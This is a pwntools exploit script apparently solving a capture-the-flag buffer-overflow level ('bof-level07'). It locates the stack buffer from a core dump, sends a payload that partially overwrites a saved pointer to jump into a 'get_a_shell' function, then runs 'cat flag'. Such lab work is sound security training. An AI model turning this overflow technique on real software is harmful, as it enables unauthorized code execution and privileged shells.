# SETUP BOILERPLATE
from pwn import *
import os

padding = 0xe00 - 0xda0 

DEBUG = False # toggles gdb.debug or process
elf = ELF('./bof-level07') # replace this with the actual level
get_a_shell = p32(elf.symbols["get_a_shell"])

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process('./bof-level07', env={"a":"a" * padding})
io.sendline(cyclic(10000)) # send 1000 junk characters
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
os.unlink(core.path) # delete the file now that we're done with it

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug('./bof-level07', env={'a':"a" * padding}, gdbscript='''
    b *0x80485fa
    continue
    ''')
else:
    io = process('./bof-level07', env={"a":"a" * padding})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE


max_len = 141
offset = 0x0
print(p32(buffer_address))

# payload = cyclic(max_len).replace(b"ajaa", get_a_shell)
payload = 4 * b"a" + get_a_shell + (max_len - 12 + 3) * b"a" + p32(buffer_address - offset)[0:1]
io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
